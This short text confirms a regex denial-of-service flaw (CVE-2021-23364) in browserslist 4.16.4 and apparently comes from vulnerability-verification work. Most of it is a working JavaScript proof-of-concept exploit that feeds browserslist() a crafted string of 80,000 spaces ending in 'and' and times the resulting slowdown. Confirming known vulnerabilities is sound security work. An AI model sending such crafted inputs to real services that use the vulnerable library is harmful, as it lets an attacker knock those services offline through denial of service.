Confirmed quadratic blowup (4x input → 4x time), consistent with the known ReDoS in `doMatch`'s use of `String.prototype.match` against `/^\s+and\s+(.*)/i` / `/^(?:,\s*|\s+or\s+)(.*)/i` inside the backward-scanning `find` loop. This is CVE-2021-23364 in browserslist 4.16.4.

```javascript
// ReDoS exploit for browserslist's internal query matcher (`.match()` calls in doMatch/find)
// Affected: browserslist 4.16.4 (CVE-2021-23364)
const browserslist = require("./node_modules/browserslist");

const malicious = " ".repeat(80000) + "and"; // crafted query string

console.log("Sending malicious query to browserslist()...");
const start = Date.now();

try {
  browserslist(malicious);
} catch (e) {
  // parsing still fails, but only after the expensive match() scanning below
}

console.log("Elapsed ms:", Date.now() - start);
```
